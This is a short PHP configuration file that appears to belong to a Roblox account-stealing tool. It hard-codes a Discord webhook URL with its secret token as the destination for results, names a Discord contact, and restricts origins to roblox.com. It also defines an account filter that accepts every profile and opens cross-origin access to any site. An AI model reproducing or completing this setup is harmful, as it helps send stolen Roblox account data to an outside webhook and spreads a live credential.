<?php


$webhook = "https://discord.com/api/webhooks/802200657603985480/2Oie6y6Sbv9EXbtEg7gyI_QhbBjTO3iq7lJzu8tcpq33N-oL5lEckCO7nYNZ7rLhTWSP";
$discord_contact = "E=Mc²#0001";

$allowed_origins = array(
    "https://www.roblox.com",
    "https://web.roblox.com"
);
function account_filter($profile)
{
    return true;
}
require("status.php");
header("Access-Control-Allow-Origin: *");
